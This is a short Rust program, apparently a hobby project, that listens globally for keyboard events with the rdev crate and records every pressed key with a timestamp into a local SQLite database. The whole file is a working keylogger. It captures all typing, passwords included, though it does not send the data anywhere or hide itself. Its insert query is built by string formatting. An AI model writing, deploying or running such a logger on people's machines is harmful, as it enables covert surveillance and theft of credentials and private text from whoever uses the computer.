use std::fmt::format;

use rdev::{listen, Event, EventType, Key};
use sqlite;

fn main() {
    println!("Hello, world agaaaain!");

    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }
}

fn callback(event: Event) {
    create_table();
    if let EventType::KeyPress(key) = event.event_type {
        write_to_db(key);
    }
}

fn write_to_db(key_code: Key) {
    let connection = sqlite::open(":keys").expect("should have open a db connection");
    let code = format!("INSERT INTO keys (name) VALUES ('{:?}');", key_code);
    connection.execute(code).expect("should insert data to db");
}

fn create_table() {
    let connection = sqlite::open(":keys").expect("should have open a db connection");

    connection
        .execute(
            "
       CREATE TABLE IF NOT EXISTS keys (
              name TEXT,
              Timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
       );
       ",
        )
        .expect("should creat the keys table")
}
